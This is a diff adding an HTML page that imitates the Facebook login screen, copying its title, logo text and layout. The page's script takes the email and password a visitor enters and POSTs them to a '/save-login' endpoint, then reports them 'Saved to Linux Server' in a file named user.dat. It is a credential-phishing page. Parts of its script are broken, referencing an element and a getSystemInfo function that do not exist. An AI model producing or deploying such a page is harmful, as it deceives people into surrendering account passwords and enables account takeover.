@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            max-width: 980px;
+            gap: 60px;
+            align-items: center;
+        }
+
+        .left-section {
+            flex: 1;
+        }
+
+        .logo {
+            color: #1877f2;
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 16px;
+        }
+
+        .subtitle {
+            font-size: 24px;
+            color: #1c1e21;
+            line-height: 1.4;
+        }
+
+        .right-section {
+            flex: 1;
+        }
+
+        .login-form {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            max-width: 396px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+
+        .login-btn:hover {
+            background: #166fe5;
+        }
+
+        .login-btn:disabled {
+            background: #a0c4ff;
+            cursor: not-allowed;
+        }
+
+        .forgot-password {
+            text-align: center;
+            display: block;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account-btn {
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .create-account-btn:hover {
+            background: #36a420;
+        }
+
+        .info-panel {
+            background: #e7f3ff;
+            border: 1px solid #1877f2;
+            border-radius: 6px;
+            padding: 12px;
+            margin-top: 16px;
+            font-size: 14px;
+        }
+
+        .file-info {
+            background: #f0f2f5;
+            border-radius: 6px;
+            padding: 12px;
+            margin-top: 16px;
+            font-size: 12px;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+
+        .success {
+            color: #42b72a;
+        }
+
+        .error {
+            color: #fa383e;
+        }
+
+        .server-info {
+            background: #fff4e6;
+            border: 1px solid #ffa94d;
+            border-radius: 6px;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+
+        .controls {
+            margin-top: 10px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .controls button {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            flex: 1;
+        }
+
+        .btn-secondary {
+            background: #65676b;
+            color: white;
+        }
+
+        .btn-info {
+            background: #17a2b8;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">facebook</div>
+            <div class="subtitle">Connect with friends and the world around you on Facebook.</div>
+        </div>
+        
+        <div class="right-section">
+            <form class="login-form" id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="email" placeholder="Email or phone number" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+                <a href="#" class="forgot-password">Forgotten password?</a>
+                <div class="divider"></div>
+                <button type="button" class="create-account-btn">Create new account</button>
+            </form>
+
+    
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = window.location.origin;
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const loginBtn = document.getElementById('loginBtn');
+            
+            loginBtn.textContent = 'Saving...';
+            loginBtn.disabled = true;
+            
+            try {
+                const response = await fetch(`${API_BASE}/save-login`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    document.getElementById('fileInfo').innerHTML = 
+                        `<span class="success">✅ Saved to Linux Server!</span>\n` +
+                        `File: user.dat\n` +
+                        `Time: ${new Date(result.timestamp).toLocaleString()}\n` +
+                        `Server: ${result.server}`;
+                    
+                   
+                } else {
+                    throw new Error(result.message);
+                }
+
+            } catch (error) {
+        
+                
+                alert('Error: ' + error.message);
+            } finally {
+                loginBtn.textContent = 'Log In';
+                loginBtn.disabled = false;
+                document.getElementById('loginForm').reset();
+            }
+        });
+
+        
+    
+
+        document.addEventListener('DOMContentLoaded', function() {
+            getSystemInfo();
+        });
+    </script>
+</body>
+</html>
